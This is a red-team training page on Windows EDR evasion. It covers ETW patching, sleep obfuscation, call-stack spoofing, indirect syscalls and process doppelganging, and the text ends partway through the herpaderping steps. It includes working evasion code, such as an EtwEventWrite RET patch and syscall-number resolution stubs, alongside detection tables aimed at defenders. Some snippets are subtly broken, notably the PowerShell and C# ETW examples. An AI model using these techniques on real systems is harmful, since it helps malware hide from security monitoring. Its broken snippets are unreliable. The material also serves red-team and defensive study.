---
layout: training-page
title: "Windows Evasion Reference — Red Team Academy"
module: "Evasion"
tags:
  - etw
  - sleep-obfuscation
  - stack-spoofing
  - syscalls
  - dll-unhooking
  - apc-injection
  - process-ghosting
page_key: "evasion-windows-reference"
---
# Windows Evasion Techniques — Red Team Reference (2023–2025)

> **Scope:** Authorized penetration testing and red team operations only. All techniques described here are well-documented in public offensive security research. Understanding these mechanisms is essential for both red teamers and defenders.

---

## 1. ETW (Event Tracing for Windows) Bypass

### Architecture Overview

ETW is Windows' built-in high-performance tracing infrastructure. It has three core components:

- **Providers** — components that emit events (e.g., `Microsoft-Windows-DotNETRuntime`, PowerShell, the kernel itself). Each provider has a GUID. Providers can be kernel-mode or user-mode.
- **Sessions** — active trace sessions that subscribe to one or more providers and collect events. Up to 64 sessions can run simultaneously. The most security-relevant session is `Microsoft-Windows-Threat-Intelligence` (a PPL-protected kernel session used by many EDRs).
- **Consumers** — processes that read events from a session buffer in real time or from a log file. EDR sensors typically run as consumers of security-relevant sessions.

The flow: `Provider emits event → ETW runtime buffers it → Session flushes buffer → Consumer (EDR) receives event`.

From a red team perspective, ETW is critical because it feeds:
- AMSI (Antimalware Scan Interface) with script content
- EDR telemetry about process creation, thread injection, .NET activity
- Windows Defender with behavioral signals

### Patching `EtwEventWrite` in ntdll

The most direct approach: patch the `EtwEventWrite` function in the current process's ntdll so it immediately returns without writing any events. This is a per-process patch — it only affects the current process's ETW instrumentation.

**How it works:**

`EtwEventWrite` is exported from `ntdll.dll`. The first bytes of the function are overwritten with a `ret` instruction (or equivalent). Because ntdll is mapped privately into each process's address space (it is copy-on-write), patching it in your process does not affect other processes.

```c
// Illustrative pattern — patch EtwEventWrite to return immediately
#include <windows.h>

BOOL PatchEtw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    // Change memory protection to RWX
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    // Overwrite with RET (0xC3) — x86-64
    *(BYTE*)pEtwEventWrite = 0xC3;

    // Restore protection
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    return TRUE;
}
```

**Variants:**
- Patch `EtwEventWriteFull` instead (called internally by `EtwEventWrite`)
- Patch `EtwNotificationRegister` to prevent providers from registering
- NOP out the relevant bytes rather than using a single RET

**Detection:** EDR products with kernel callbacks (e.g., `PsSetLoadImageNotifyRoutine`) can detect when ntdll pages are modified. Some EDRs hash the ntdll `.text` section on load and periodically verify it. Windows 10 21H2+ Control Flow Guard can complicate hook-based patching.

### Per-Provider Disabling via `NtTraceControl`

Rather than blanket-patching ETW, a more surgical approach disables specific providers. The kernel function `NtTraceControl` with `TraceControlDisableProvider` can disable a provider for the current process.

```c
// Illustrative — disable a specific ETW provider by GUID
typedef NTSTATUS (NTAPI *pNtTraceControl)(
    ULONG  FunctionCode,
    PVOID  InBuffer,
    ULONG  InBufferLen,
    PVOID  OutBuffer,
    ULONG  OutBufferLen,
    PULONG ReturnLength
);

// Function code 0x1F = EtwpDisableProvider (undocumented, Windows 10+)
// InBuffer contains an ETW_ENABLE_INFO structure with the provider GUID

// Key providers to target for .NET/PowerShell activity:
// {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4} = Microsoft-Windows-DotNETRuntime
// {A0C1853B-5C40-4B15-8766-3CF1C58F985A} = PowerShell
// {44608A51-1851-4456-98B3-3F9742BE5B74} = Microsoft-Antimalware-Scan-Interface
```

This is more evasive than full patching because individual provider GUIDs are silenced rather than making a detectable RET patch to ntdll.

### PowerShell ETW Bypass

PowerShell emits ETW events through the `PowerShell` provider GUID `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}`. The most common bypass patches the `EtwEventWrite` function from within the PowerShell process itself.

```powershell
# Classic PowerShell ETW patch — patches EtwEventWrite in current process
# Note: Detected by many modern EDRs via kernel callbacks

$PatchEtw = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("ntdll.dll")]
    public static extern int NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect
    );

    public static void Patch() {
        var ntdll = System.Reflection.Assembly.Load(
            "ntdll.dll"  // This is illustrative — use LoadLibrary in practice
        );
        IntPtr addr = Win32.GetProcAddress(
            Win32.GetModuleHandle("ntdll.dll"), "EtwEventWrite"
        );
        uint oldProtect;
        IntPtr size = new IntPtr(1);
        NtProtectVirtualMemory(
            new IntPtr(-1), ref addr, ref size, 0x40, out oldProtect
        );
        System.Runtime.InteropServices.Marshal.WriteByte(addr, 0xC3);
        NtProtectVirtualMemory(
            new IntPtr(-1), ref addr, ref size, oldProtect, out oldProtect
        );
    }
}
"@

# Alternative: target the .NET ETW provider registration directly (see below)
```

**Alternative — Script Block Logging bypass:** PowerShell's script block logging (event ID 4104) goes through `System.Management.Automation`. Patching `AmsiScanBuffer` (AMSI) often also suppresses the ETW pipeline for script content. The two are separate but complementary bypasses.

### .NET ETW Bypass

The .NET runtime emits rich telemetry via `Microsoft-Windows-DotNETRuntime`. This feeds EDRs with information about loaded assemblies, JIT compilation, and exception events — critical for detecting in-memory .NET loaders.

**Approach 1: Disable via `EventSource` reflection**

```csharp
// Disable .NET ETW provider from within a .NET process via reflection
// Accesses internal EventListener fields to disable the runtime provider
using System.Reflection;

var f = typeof(System.Diagnostics.Eventing.EventSource)
    .GetField("m_eventSourceEnabled", BindingFlags.NonPublic | BindingFlags.Instance);

// Find the runtime EventSource
foreach (var source in System.Diagnostics.Eventing.EventSource.GetSources()) {
    if (source.Name == "Microsoft-Windows-DotNETRuntime") {
        f.SetValue(source, false);
    }
}
```

**Approach 2: Patch `EtwEventWriteFull` in ntdll**

Same principle as the PowerShell case but executed from a .NET P/Invoke call. Some red team frameworks patch this during their .NET assembly loader initialization.

**Approach 3: GC/JIT flag manipulation**

The `COMPlus_ETWEnabled=0` environment variable disables .NET ETW at process startup. Setting this before loading a .NET runtime (e.g., via environment variable manipulation in a native loader) prevents .NET ETW events entirely.

### Detection by Defenders

| Detection Method | Mechanism | Effectiveness |
|---|---|---|
| Kernel page integrity | EDR kernel driver hashes ntdll pages on load, detects in-memory modification | High (requires kernel driver) |
| `PsSetLoadImageNotifyRoutine` | Monitors ntdll loads; can snapshot .text section | Medium |
| ETW self-monitoring | ETW session monitors for provider disable events | Medium — disabled provider generates a meta-event |
| Sequence anomaly | Absence of expected ETW events (e.g., no .NET events despite .NET activity) | High for mature SOCs |
| Memory scanning | Periodic scan of ntdll in running processes for known patch bytes | Medium |
| `NtTraceControl` monitoring | Inline hook on `NtTraceControl` syscall to detect provider disabling | High |

**Key GitHub References:**
- `https://github.com/med0x2e/NoAmci` — AMSI + ETW bypass via memory patching
- `https://github.com/boku7/HOLLOW` — ETW patching as part of process hollowing
- `https://github.com/RedTeamOperations/Advanced-Process-Injection-Workshop` — workshop including ETW bypasses
- Research blog: "Detecting and Preventing ETW Bypass" — posts by Elastic Security, CrowdStrike, MDSec

---

## 2. Sleep Obfuscation

### Why It Matters — EDR Memory Scanning Threat Model

Modern EDRs (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) perform periodic **memory scanning** of running processes. The key threat: while a beacon (e.g., Cobalt Strike) is sleeping between check-ins, it sits in memory as a recognizable blob. Signatures exist for:

- Cobalt Strike's default `beacon.dll` reflective loader header
- Common shellcode stubs (`fc 48 83 e4 f0 e8` etc.)
- Beacon configuration structures (XOR-encoded but identifiable patterns)

**The attack:** During the sleep interval, EDR invokes its scanner (or uses a kernel callback triggered on a timer) and finds the implant's memory region. Beacon is sitting there, largely idle, as an easy scan target.

**Sleep obfuscation** addresses this by **encrypting the beacon's own memory during the sleep interval**. The beacon:
1. Encrypts its own `.text` and `.data` sections with RC4/AES/ChaCha20
2. Sleeps
3. Decrypts itself before execution resumes

This means any memory scan during the sleep window finds only encrypted garbage — no signatures match.

### Ekko — Timer-Based Encryption

**Author:** `Cracked5pider` / `5pider`
**GitHub:** `https://github.com/Cracked5pider/Ekko`

Ekko is the most widely referenced sleep obfuscation implementation. It uses **Windows timer queue timers** (`CreateTimerQueueTimer`) to sequence the encrypt → sleep → decrypt operations without requiring the implant's own thread to remain executable during sleep.

**Mechanism:**
1. Create a timer queue with `CreateTimerQueueTimer`
2. Queue three timers in sequence:
   - **Timer 1:** Call `SystemFunction032` (RtlEncryptMemory wrapper) to RC4-encrypt the beacon's memory region
   - **Timer 2:** Call `WaitForSingleObject` to sleep for the desired interval
   - **Timer 3:** Call `SystemFunction032` again to decrypt memory
3. The calling thread waits on an event that Timer 3 signals on completion
4. During the `WaitForSingleObject` in Timer 2, the beacon's memory is encrypted

**Why timers?** Timer callbacks execute in a thread pool thread — this helps dissociate the call stack from the implant's main thread and avoids the implant's memory needing to be executable while the actual sleep occurs.

```c
// Ekko conceptual pattern (simplified)
// Full implementation: github.com/Cracked5pider/Ekko

VOID EkkoSleep(DWORD SleepTime) {
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);

    EKKO_PARAMS params = {
        .ImageBase  = NtCurrentTeb()->ProcessEnvironmentBlock->ImageBaseAddress,
        .ImageSize  = GetImageSize(),
        .SleepTime  = SleepTime,
        .hEvent     = hEvent,
    };

    // Timer 1: encrypt at T+0ms
    CreateTimerQueueTimer(&params.hTimer[0], hTimerQueue,
        EncryptCallback, &params, 0, 0, WT_EXECUTEINTIMERTHREAD);

    // Timer 2: sleep at T+100ms
    CreateTimerQueueTimer(&params.hTimer[1], hTimerQueue,
        SleepCallback, &params, 100, 0, WT_EXECUTEINTIMERTHREAD);

    // Timer 3: decrypt at T+100+SleepTime ms
    CreateTimerQueueTimer(&params.hTimer[2], hTimerQueue,
        DecryptAndSignalCallback, &params, 100 + SleepTime, 0,
        WT_EXECUTEINTIMERTHREAD);

    WaitForSingleObject(hEvent, INFINITE);
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    CloseHandle(hEvent);
}
```

**Detection:** Ekko leaves observable patterns — the timer queue callbacks, use of `SystemFunction032`, and the specific sequence of ROP-like operations in the timer thread. CrowdStrike and Elastic published detections for Ekko in late 2022/2023.

### Foliage — NtContinue Chained APC

**GitHub:** `https://github.com/SecIdiot/FOLIAGE`

Foliage takes a different approach: instead of timer callbacks, it uses **NtQueueApcThread + NtContinue chaining** to build a sequence of function calls (an "APC gadget chain") that performs encrypt → sleep → decrypt.

**Mechanism:**
1. Create a suspended thread
2. Queue APC entries to the thread using `NtQueueApcThread`
3. Each APC entry uses `NtContinue` to set up a CONTEXT structure pointing to the next function in the chain (encrypt, sleep, decrypt)
4. Resume the thread — it executes the chain by "continuing" through each context

The key advantage: the call stack during sleep looks like it originates from a legitimate system thread with no implant frames visible. The implant's primary thread is idle/sleeping with an innocent-looking stack.

**Why NtContinue?** `NtContinue` restores a full CPU context (registers + instruction pointer) from a `CONTEXT` struct, making it essentially a controlled `setjmp/longjmp` that can redirect execution to arbitrary addresses. Chained together, it builds a call sequence without traditional `CALL` instructions that would push return addresses onto the stack.

### Cronos — Thread Timer

**GitHub:** `https://github.com/Idov31/Cronos`

Cronos is similar to Ekko but uses `CreateWaitableTimer` + `SetWaitableTimer` rather than timer queue timers. It also adds stack spoofing during the sleep window.

**Mechanism:**
1. Set a waitable timer for encryption
2. `WaitForSingleObjectEx` in alertable state (allows APC delivery)
3. When the timer fires, the APC callback encrypts memory
4. Re-arm the timer for `SleepDuration` milliseconds later
5. Decrypt APC fires, signals completion

The alertable wait is key — it means the thread has a normal-looking wait state and the encrypt/decrypt operations are delivered as APCs rather than as timer callbacks, making the call chain look different from Ekko.

### Zilean / Poppy

**Zilean** extends sleep obfuscation with a **stack-aware** approach. During the sleep preparation, it:
1. Saves the current call stack frames
2. Replaces the return addresses on the stack with spoofed frames (pointing to legitimate Windows DLL code)
3. Encrypts memory
4. Sleeps
5. Restores original stack and decrypts

**Poppy** (`https://github.com/nicholasmckinney/poppy`) is a PoC implementing sleep obfuscation with memory permission changes. During sleep, it changes the beacon memory region's protection to `PAGE_NOACCESS` (causing an immediate AV exception if scanned) then `PAGE_EXECUTE_READ` on wake. This causes scanning threads to fault rather than read implant memory.

**NOTELST/Gargoyle** — Related: Gargoyle (by **JLospinoso**) is an older (2017) but conceptually important technique where the beacon becomes non-executable during sleep by using ROP gadgets to change memory protection, sleep, then make it executable again. Modern sleep obfuscation tools build on this foundation.

### RC4/AES Encryption of Implant Memory

The encryption algorithm used during sleep matters for detection:

| Algorithm | Speed | Key Size | Notes |
|---|---|---|---|
| RC4 via `SystemFunction032` | Very fast | Variable | Uses built-in Windows crypto — no external dep, but the call is detectable |
| AES-128/256 via `SystemFunction040` | Fast | 128/256-bit | Also a built-in Windows export from `advapi32.dll` |
| Custom ChaCha20/XOR | Fastest | Variable | No Windows API call — harder to detect via API monitoring |
| `BCryptEncrypt` | Moderate | Variable | Standard CNG API, less suspicious in isolation |

Modern implementations like **Ekko-ng** and **ShellcodeFluctuation** (`https://github.com/mgeeky/ShellcodeFluctuation`) use a combination: XOR the memory, then change the page permissions to `PAGE_NOACCESS` or `PAGE_READONLY`, so even if the XOR key is found, the memory can't be read without triggering a fault.

### WaitForSingleObject vs CreateTimerQueueTimer

| Approach | Pros | Cons |
|---|---|---|
| `WaitForSingleObject` | Simple; thread enters standard wait state | Implant thread must remain alive with its stack; call stack potentially visible |
| `CreateTimerQueueTimer` (Ekko) | Encryption happens in thread pool thread; implant thread can have spoofed/empty stack | Timer queue operations are observable; `SystemFunction032` call pattern is signatured |
| `NtContinue` chain (Foliage) | No timer queue artifacts; very clean call chain | Complex to implement; race conditions possible |
| `SetWaitableTimer` alertable (Cronos) | Thread pool-independent; APCs look native | Alertable sleep state with APC delivery can be a detection signal |

**GitHub References:**
- `https://github.com/Cracked5pider/Ekko` — Ekko sleep obfuscation
- `https://github.com/mgeeky/ShellcodeFluctuation` — permission-change sleep obfuscation
- `https://github.com/Idov31/Cronos` — waitable timer approach
- `https://github.com/SecIdiot/FOLIAGE` — NtContinue APC chain
- `https://github.com/nicholasmckinney/poppy` — PAGE_NOACCESS approach
- Research: "Bypassing Memory Scanners with Obfuscated Payloads" — Cobalt Strike blog posts

---

## 3. Stack Spoofing

### Why Call Stacks Matter to EDR

When an EDR intercepts a suspicious API call (e.g., `VirtualAllocEx`, `NtCreateThreadEx`, `OpenProcess`), it doesn't just look at the call arguments — it **walks the call stack** to understand call context. The call stack reveals:

- Whether the caller originates from a known DLL (e.g., `kernel32.dll`) or from an anonymous memory region (a red flag)
- Whether the call chain includes known-legitimate frames (e.g., `MFC`, `ntdll`, `kernelbase`) or shows a suspicious direct path
- Whether return addresses point to executable sections of mapped images or to dynamically allocated RWX memory

A typical implant's call stack looks like:
```
0x7ff8xxxx - NtAllocateVirtualMemory  [ntdll]
0x1234abcd - beacon_alloc             [no image — RWX heap]  <-- RED FLAG
0x1234aaaa - beacon_main              [no image — RWX heap]
```

A legitimate process's call stack looks like:
```
0x7ff8xxxx - NtAllocateVirtualMemory  [ntdll]
0x7ff7xxxx - VirtualAllocEx           [kernelbase.dll]
0x7ff6xxxx - RtlHeapAlloc             [ntdll]
0x7ff5xxxx - malloc                   [ucrtbase.dll]
0x4012xx   - main                     [explorer.exe +0x12xx]
```

Stack spoofing addresses this by making the implant's call stack look legitimate at the moment of a sensitive API call.

### Return Address Spoofing

The core technique: before calling a sensitive API, **replace the return address on the stack** with an address inside a legitimate DLL's executable section. After the API returns, restore the real return address.

```c
// Conceptual: trampolined call with spoofed return address
// Real implementation requires ASM and careful register management

// 1. Find a RET gadget in a trusted DLL (e.g., ntdll.dll + offset)
PVOID retGadget = FindRetGadget("ntdll.dll");  // points to a C3 byte

// 2. On the stack, replace [rsp] (our return address) with retGadget
// 3. Call the target function — it sees retGadget as caller
// 4. When target function returns, it returns to retGadget
// 5. retGadget (a RET) immediately returns to our real next instruction
//    because we've already set up RSP to point back to our real return

// In practice this is implemented in MASM/NASM:
// push rax               ; save rax
// mov rax, [rsp+8]       ; get our return addr
// mov [rsp+8], gadget    ; replace with spoofed addr
// pop rax                ; restore rax
// call Target
```

### Synthetic Call Stack Frames

More sophisticated than simple return address spoofing, this technique **constructs fake stack frames** that make the call look like it originated from a legitimate module chain.

The implementation uses `RtlCaptureContext` + `RtlRestoreContext` (or direct manipulation of the RSP/RBP registers and stack memory) to:
1. Allocate space on the stack for N fake frames
2. Write frame pointer chains (`rbp` values linking frames together)
3. Write return addresses pointing into legitimate DLLs for each fake frame
4. Call the target API with this synthetic stack in place

EDR products walking the stack via `StackWalk64` or `RtlWalkFrameChain` will see the fake frames.

**Key constraint:** The fake DLL addresses must be in executable (+X) memory and the frame pointers must form a valid chain, otherwise stack walkers will bail out early and the spoof fails.

### Thread Hijacking for Clean Stacks

An alternative approach that avoids stack manipulation: **hijack a legitimate thread** to make the sensitive call on your behalf.

1. Find a legitimate process thread in a alertable wait state
2. Use `SetThreadContext` to redirect that thread to a shellcode stub
3. The stub makes the sensitive API call
4. Call stack shows the hijacked thread's original frames plus the API call — no implant frames visible

This is more complex operationally and risks destabilizing the target thread, but produces genuinely clean call stacks since the execution doesn't come from implant memory.

### ThreadStackSpoofer by mgeeky

**GitHub:** `https://github.com/mgeeky/ThreadStackSpoofer`

mgeeky's implementation is the canonical reference for x64 Windows stack spoofing. Key features:

- Hooks a target function by replacing its first bytes with a jump to a spoofing trampoline
- The trampoline modifies return addresses on the stack before the hooked function executes
- Uses a **return address table** to store real return addresses and substitute them with pointers into legitimate DLL code
- Supports dynamic gadget finding — scans loaded DLLs for suitable `RET` gadgets at runtime
- Includes **frame pointer fixing** to ensure `rbp` chains are valid for stack walkers that follow both return addresses and frame pointers

**Usage in practice:** ThreadStackSpoofer is typically integrated into a loader or BOF (Beacon Object File) that calls it before any sensitive API invocations.

### Hardware Breakpoint-Based Spoofing

A more recent technique (2023+) uses **hardware breakpoints** (via the `Dr0`–`Dr3` debug registers) as execution hooks rather than modifying memory.

**Mechanism:**
1. Set a hardware breakpoint on the target sensitive API (e.g., `NtAllocateVirtualMemory`)
2. Register a vectored exception handler (VEH) via `AddVectoredExceptionHandler`
3. When execution reaches the breakpoint, `EXCEPTION_SINGLE_STEP` fires
4. The VEH inspects the current context — modifies return addresses on the stack before continuing
5. Continues execution (clears the trap flag, re-enables the breakpoint for next call)

**Advantage over memory patching:** No modification to executable memory regions — the function code is unmodified. The breakpoint is set via `SetThreadContext` or direct register writes, which is harder for EDRs to detect via memory integrity checks.

**GitHub:** `https://github.com/rad9800/hwbp4mw` — hardware breakpoint-based memory watches

### Interlaced Frames Technique

Published in 2023 by **namazso** and others, interlaced frames interleave real implant frames with fake legitimate frames:

```
Fake frame 1:  ntdll!RtlUserThreadStart+0x21     [legit]
Real frame:    beacon+0x4142                      [implant — legitimately needed]
Fake frame 2:  kernel32!BaseThreadInitThunk+0x14  [legit]
Real frame:    NtAllocateVirtualMemory            [API being called]
```

The insight: even if an EDR detects one "suspicious" frame, surrounding it with enough legitimate frames may cause the heuristic to score the overall call chain as benign. Some EDRs only flag stacks where the *bottom* frames are anonymous — interlacing puts a legitimate-looking bottom frame.

**References:**
- `https://github.com/mgeeky/ThreadStackSpoofer` — mgeeky's implementation
- `https://github.com/klezVirus/SilentMoonwalk` — "shadow stack" spoofing implementation
- `https://github.com/WithSecureLabs/CallStackMasker` — WithSecure call stack masking PoC
- Blog: "Masking Malicious Memory Artifacts" — MDSec blog (2022)
- Blog: "Hiding Your .NET/C# Tools in Process" — Adam Chester / XPN (2022)

---

## 4. Indirect Syscalls

### Why Direct Syscalls Get Detected

A common EDR evasion technique is bypassing userland hooks by calling syscalls directly rather than going through ntdll's hooked stubs. However, naive direct syscall implementations have evolved toward detection:

**Problem 1 — Hardcoded SSNs (Syscall Service Numbers)**

Early tools (2020-era) hardcoded the SSN for each syscall: `mov eax, 0x18 ; syscall`. This is fragile because SSNs change between Windows versions and patch levels. More critically, EDRs can detect patterns of syscall instructions appearing outside of ntdll.

**Problem 2 — Syscall from non-ntdll addresses**

Modern EDRs use kernel ETW callbacks (`PsSetLoadImageNotifyRoutine`, `EtwTi` providers) and CPU Last Branch Record (LBR) analysis to determine where a `syscall` instruction executed from. A syscall that originates from a heap-allocated buffer or a shellcode region is flagged.

**Problem 3 — Predictable SSN patterns**

Static analysis of shellcode/PE files reveals syscall stubs at fixed offsets with predictable `mov eax, <number>` patterns.

### Hell's Gate — Dynamic SSN Resolution

**Authors:** am0nsec, RtlMateusz
**GitHub:** `https://github.com/am0nsec/HellsGate`
**Paper:** VX-Underground white paper, 2020

Hell's Gate resolves SSNs **dynamically at runtime** by parsing the in-memory ntdll export table and reading the actual syscall stub bytes.

**How it works:**

A typical unhooked ntdll syscall stub looks like:
```asm
; NtAllocateVirtualMemory stub in clean ntdll
4C 8B D1          mov r10, rcx
B8 18 00 00 00    mov eax, 0x18   ; <-- SSN is here at offset +4
0F 05             syscall
C3                ret
```

Hell's Gate:
1. Gets the base address of ntdll via `PEB->Ldr->InMemoryOrderModuleList`
2. Parses the Export Directory Table to find each `Nt*` function's RVA
3. Reads the bytes at the function's address
4. Extracts the SSN from the `mov eax, <SSN>` instruction (byte offset +4)

```c
// Hell's Gate SSN extraction (illustrative)
BOOL GetSyscallNumber(LPCSTR functionName, PDWORD pSsn) {
    // Get ntdll base from PEB (no GetModuleHandle — avoids API calls)
    HMODULE hNtdll = GetNtdllBase();  // walks PEB->Ldr

    // Parse EAT to find function RVA
    PDWORD exportRva = GetExportRva(hNtdll, functionName);
    if (!exportRva) return FALSE;

    PBYTE stub = (PBYTE)hNtdll + *exportRva;

    // Check for clean stub pattern: 4C 8B D1 B8 XX 00 00 00
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        *pSsn = *(DWORD*)(stub + 4);
        return TRUE;
    }

    return FALSE;  // Hooked — see Halo's Gate for handling this case
}
```

### Halo's Gate — Handling Hooked ntdll

**GitHub:** `https://github.com/trickster0/TartarusGate` (Halo's Gate concept)

When EDR hooks ntdll, the stub bytes are replaced with a JMP to the EDR's trampoline. The `4C 8B D1 B8` pattern is gone. Halo's Gate extends Hell's Gate to handle this:

**The key insight:** ntdll's `Nt*` syscall stubs are **sorted by SSN**. If `NtAllocateVirtualMemory` is at SSN 0x18, then adjacent functions have SSNs 0x17 and 0x19. If a stub is hooked (JMP patch), we can look at neighboring stubs (±1 in the sorted order) and derive the target SSN by offset.

```c
// Halo's Gate: resolve SSN for a hooked stub via neighbor stubs
BOOL HalosGate(LPCSTR functionName, PDWORD pSsn) {
    PBYTE stub = GetStubAddress(functionName);

    // Check if hooked (JMP/MOV patch at start)
    if (IsHooked(stub)) {
        // Walk neighboring stubs (sorted by SSN in ntdll EAT)
        for (int i = 1; i < 64; i++) {
            // Previous stub (SSN - i)
            PBYTE prevStub = stub - (i * STUB_SIZE);
            if (!IsHooked(prevStub) && IsValidStub(prevStub)) {
                *pSsn = ExtractSsn(prevStub) + i;
                return TRUE;
            }
            // Next stub (SSN + i)
            PBYTE nextStub = stub + (i * STUB_SIZE);
            if (!IsHooked(nextStub) && IsValidStub(nextStub)) {
                *pSsn = ExtractSsn(nextStub) - i;
                return TRUE;
            }
        }
    }
    return ExtractSsn(stub, pSsn);
}
```

### FreshyCalls — Sorting EAT by Address

**GitHub:** `https://github.com/crummie5/FreshyCalls`

Rather than relying on adjacent stubs having predictable SSN offsets, FreshyCalls sorts the entire ntdll Export Address Table (EAT) by **function address** (RVA). Because Windows ntdll lays out `Nt*` syscall stubs in SSN order in memory, sorting by address gives you SSN order directly.

```c
// FreshyCalls conceptual approach
// 1. Get all Nt* export addresses from ntdll EAT
// 2. Sort them by address (ascending)
// 3. The position in the sorted list = SSN
// NtAccessCheck is typically SSN 0, NtWorkerFactoryWorkerReady is near the end

// This is robust to hooking because:
// - You don't need to read the actual stub bytes
// - As long as you can determine address ordering, you get SSN ordering
// - JMP patches don't change the export's listed address
```

### SysWhispers3 — Randomized Stubs + Indirect Calls

**Author:** klezVirus (fork of SysWhispers2 by jthuraisamy)
**GitHub:** `https://github.com/klezVirus/SysWhispers3`

SysWhispers3 is the most widely used syscall toolkit (2022-2024). It generates C header/ASM stub files for direct or indirect syscalls with several evasion features:

**Key improvements over SysWhispers2:**
- **Indirect syscalls:** Instead of executing `syscall` from the implant's own stub, it jumps to the `syscall` instruction *inside ntdll* — so the syscall appears to originate from ntdll's address range
- **Randomized stub placement:** Generated stubs are placed at random offsets in the PE file, disrupting signature matching
- **Egg-hunting stubs:** Optional mode where the actual syscall stub is found at runtime via an egg/magic marker, avoiding static stubs in the binary

```c
// SysWhispers3 usage pattern (generated header)
// After including the generated header and calling SW3_PopulateSyscallList():

NTSTATUS status = NtAllocateVirtualMemory(
    hProcess,           // ProcessHandle
    &baseAddr,          // BaseAddress
    0,                  // ZeroBits
    &regionSize,        // RegionSize
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READ
);

// Under the hood, SW3 resolves the SSN dynamically and either:
// a) Direct: executes "mov eax, SSN ; syscall" from inline stub
// b) Indirect: executes "mov eax, SSN ; jmp [ntdll_syscall_addr]"
//    — the actual SYSCALL instruction executes inside ntdll
```

**The indirect syscall stub (MASM):**
```asm
; SysWhispers3 indirect syscall pattern
NtAllocateVirtualMemory PROC
    mov [rsp + 8], rcx          ; Save RCX
    mov [rsp + 16], rdx         ; Save RDX
    mov [rsp + 24], r8          ; Save R8
    mov [rsp + 32], r9          ; Save R9
    sub rsp, 28h
    mov ecx, 0F42E8F12h         ; Hash of "NtAllocateVirtualMemory"
    call SW3_GetSyscallAddress  ; Returns address of syscall instr in ntdll
    mov r15, rax                ; Save syscall gadget address
    call SW3_GetSyscallNumber   ; Returns SSN
    add rsp, 28h
    mov rcx, [rsp + 8]          ; Restore RCX
    mov rdx, [rsp + 16]         ; Restore RDX
    mov r8,  [rsp + 24]         ; Restore R8
    mov r9,  [rsp + 32]         ; Restore R9
    mov r10, rcx
    mov eax, SSN_PLACEHOLDER    ; SSN filled at runtime
    jmp r15                     ; Jump to syscall gadget in ntdll
NtAllocateVirtualMemory ENDP
```

### Tartarus Gate

**GitHub:** `https://github.com/trickster0/TartarusGate`

Tartarus Gate combines Hell's Gate + Halo's Gate into a unified framework and adds **VEH-based (Vectored Exception Handler) hook detection**. When a stub is hooked with an INT3 (breakpoint) rather than a JMP, the Hell's Gate byte-pattern check fails. Tartarus Gate detects this by examining additional byte patterns:

```c
// Tartarus Gate: detect INT3 hooks in addition to JMP hooks
if (stub[0] == 0xCC) {
    // INT3 hook — use neighbor SSN resolution (Halo's Gate logic)
}
if (stub[0] == 0xE9 || stub[0] == 0xFF) {
    // JMP/indirect JMP hook
}
```

Tartarus Gate is a common base for custom implant syscall resolution in 2023-2024 tooling.

### RecycledGate

**GitHub:** `https://github.com/thefLink/RecycleGate`

RecycledGate avoids the need to resolve SSNs entirely by **re-using existing syscall stubs in ntdll** rather than building new ones. The approach:

1. Scan ntdll for all `syscall` instruction bytes (`0F 05`)
2. For each found, check if the preceding bytes are a valid SSN setup: `mov eax, <N>`
3. Collect a list of (SSN, syscall_address) pairs
4. To call a syscall: set `eax` to the desired SSN and jump to any found `syscall` instruction

This means the `syscall` instruction always executes inside ntdll — similar to indirect syscalls but without needing a separate stub generation tool. The SSN is still needed, but only for the `mov eax` — no custom stub code is ever executed.

**Tool references:**
- `https://github.com/am0nsec/HellsGate` — original Hell's Gate
- `https://github.com/klezVirus/SysWhispers3` — SysWhispers3
- `https://github.com/trickster0/TartarusGate` — Tartarus Gate
- `https://github.com/thefLink/RecycleGate` — RecycledGate
- `https://github.com/crummie5/FreshyCalls` — FreshyCalls

---

## 5. Process Ghosting / Process Herpaderping / Process Doppelgänging

These three techniques all exploit different points in the Windows process creation lifecycle to create a process whose image on disk or in memory differs from what security tools see.

### Process Doppelgänging

**Author:** enSilo (Tal Liberman, Eugene Kogan)
**Presented:** Black Hat Europe 2017
**GitHub:** Multiple PoCs — `https://github.com/hasherezade/process_doppelganging`

**Mechanism:**

Exploits Windows NTFS Transactions (TxF — Transactional NTFS):

1. **Create a transaction** (`CreateTransaction`)
2. **Open a legitimate file** (e.g., `notepad.exe`) **within the transaction** (`CreateFileTransacted`)
3. **Overwrite the file with malicious payload** — this write exists only within the transaction scope, not visible to other processes or the filesystem
4. **Create a section** from the transacted file (`NtCreateSection` with `SEC_IMAGE`)
5. **Create a process** from the section (`NtCreateProcessEx`)
6. **Roll back the transaction** — the disk is restored to the original file; the malicious section remains in memory
7. Create threads and initialize the process

**Evasion mechanism:** When AV/EDR scans the process, it follows the image path on disk — which now points back to the original clean executable (post-rollback). The in-memory image was created before rollback, so it contains the payload.

**Current status:** Windows 10 RS3+ (Fall Creators Update) partially mitigated this. Modern EDRs (2022+) specifically monitor `NtCreateProcessEx` with transacted section handles. Considered largely detected by mature EDR products, but still encountered in legacy environments.

### Process Herpaderping

**Author:** jxy-s
**GitHub:** `https://github.com/jxy-s/herpaderping`
**Published:** 2020

**Mechanism:**

Rather than using NTFS transactions, Herpaderping exploits a race condition in **how the Windows image cache works**:

1. Write the malicious payload to a new file on disk
2. Create a section from that file (`NtCreateSection` with `SEC_IMAGE`)
   — Windows caches the image backing the section
3. **Overwrite the file on disk** with a benign-looking payload (e.g., zeros or a copy of `notepad.exe`)
4. Create a process from the section (`NtCreateProcessEx`)
